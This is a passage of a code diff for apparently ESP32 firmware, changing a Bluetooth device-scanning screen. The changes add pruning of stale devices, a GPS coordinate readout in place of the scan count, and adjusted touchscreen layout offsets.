+                fySelectedIdx = fyDeviceCount - 1;
+            }
+            if (fyScrollOffset > 0 && fyScrollOffset >= fyDeviceCount) {
+                fyScrollOffset = (fyDeviceCount > FY_MAX_VISIBLE) ? fyDeviceCount - FY_MAX_VISIBLE : 0;
+            }
+            // Don't increment i — check the device that shifted into this slot
+        } else {
+            i++;
+        }
+    }
+}
+
 static void fyDrawRssiBar(int x, int y, int8_t rssi) {
     // 6 segments, each 3px wide x 8px tall
     int segments = 0;
@@ -12720,6 +12540,7 @@ static void fyScanTask(void* param) {
         BLEScanResults results = pFyScan->start(FY_SCAN_DURATION, false);
         fyProcessResults(results);
         pFyScan->clearResults();
+        fyPruneStaleDevices();
         fyTotalScans++;
         vTaskDelay(pdMS_TO_TICKS(FY_RESCAN_DELAY));
     }
@@ -12792,7 +12613,7 @@ static void fyDrawStatus() {
 }
 
 static void fyDrawStats() {
-    tft.fillRect(0, 72, SCREEN_WIDTH, 14, HALEHOUND_BLACK);
+    tft.fillRect(0, 72, SCREEN_WIDTH, 18, HALEHOUND_BLACK);
     tft.setTextSize(1);
     tft.setTextColor(HALEHOUND_MAGENTA);
 
@@ -12805,16 +12626,23 @@ static void fyDrawStats() {
     tft.setCursor(95, 75);
     tft.printf("D:%d", fyDeviceCount);
 
-    // Scan count
-    tft.setCursor(155, 75);
-    tft.printf("S:%lu", (unsigned long)fyTotalScans);
+    // GPS status (replaces scan count — way more useful)
+    tft.setCursor(135, 75);
+    if (gpsHasFix()) {
+        GPSData gd = gpsGetData();
+        tft.setTextColor(HALEHOUND_GREEN);
+        tft.printf("GPS:%.4f,%.4f", gd.latitude, gd.longitude);
+    } else {
+        tft.setTextColor(HALEHOUND_GUNMETAL);
+        tft.print("GPS:NO FIX");
+    }
 
-    tft.drawLine(0, 87, SCREEN_WIDTH, 87, HALEHOUND_GUNMETAL);
+    tft.drawLine(0, 89, SCREEN_WIDTH, 89, HALEHOUND_GUNMETAL);
 }
 
 static void fyDrawDeviceList() {
-    // Clear list area (below stats, above buttons)
-    tft.fillRect(0, 88, SCREEN_WIDTH, SCREEN_HEIGHT - 88 - 30, HALEHOUND_BLACK);
+    // Clear list area (below stats divider, above buttons)
+    tft.fillRect(0, 90, SCREEN_WIDTH, SCREEN_HEIGHT - 90 - 32, HALEHOUND_BLACK);
 
     if (fyDeviceCount == 0) {
         // Empty state with animated dots
@@ -12835,7 +12663,7 @@ static void fyDrawDeviceList() {
         return;
     }
 
-    int y = 90;
+    int y = 92;
     int visibleCount = (fyDeviceCount - fyScrollOffset);
     if (visibleCount > FY_MAX_VISIBLE) visibleCount = FY_MAX_VISIBLE;
 
@@ -12897,7 +12725,7 @@ static void fyDrawDeviceList() {
     if (fyDeviceCount > FY_MAX_VISIBLE) {
         tft.setTextColor(HALEHOUND_GUNMETAL);
         tft.setTextSize(1);
-        tft.setCursor(SCREEN_WIDTH - 30, 90);
+        tft.setCursor(SCREEN_WIDTH - 30, 92);
         tft.printf("%d/%d", fyScrollOffset + 1, fyDeviceCount);
     }
 }
@@ -13329,9 +13157,9 @@ static void fyHandleTouch() {
         }
     }
 
-    // ── Device list tap (y 90 to SCREEN_HEIGHT-30) ──
-    if (ty >= 90 && ty < SCREEN_HEIGHT - 30 && fyDeviceCount > 0) {
-        int tappedRow = (ty - 90) / FY_LINE_HEIGHT;
+    // ── Device list tap (y 92 to SCREEN_HEIGHT-30) ──
+    if (ty >= 92 && ty < SCREEN_HEIGHT - 30 && fyDeviceCount > 0) {
+        int tappedRow = (ty - 92) / FY_LINE_HEIGHT;
         int tappedIdx = tappedRow + fyScrollOffset;
         if (tappedIdx >= 0 && tappedIdx < fyDeviceCount) {
             fySelectedIdx = tappedIdx;
@@ -13376,6 +13204,15 @@ void setup() {
     fyDrawIconBar();
     fyDrawTitle();
 
+    // Init GPS (same pattern as wardriving — auto-scans pins/baud, starts background task)
+    gpsSetup();
+    gpsStartBackground();
+    for (int i = 0; i < 50; i++) {
+        gpsUpdate();
+        delay(10);
+    }
+    Serial.println("[FLOCK] GPS initialized");
+
     // Init BLE
     WiFi.mode(WIFI_OFF);
     delay(50);
@@ -13416,6 +13253,9 @@ void setup() {
 
 void loop() {
     if (!fyInitialized) return;
+
+    // Feed GPS parser
+    gpsUpdate();
 
     // Touch and button handling
     touchButtonsUpdate();
@@ -13478,6 +13318,7 @@ void loop() {
             fyDrawStatus();
             fyDrawStats();
             fyDrawDeviceList();
+            fyDrawBottomButtons();
         }
 
         // Alert flash
@@ -13495,6 +13336,9 @@ void cleanup() {
     if (pFyScan) pFyScan->stop();
     BLEDevice::deinit(false);
     pFyScan = nullptr;
+
+    // Stop GPS background task and restore serial
+    gpsStopBackground();
 
     fyInitialized = false;
     fyExitRequested = false;
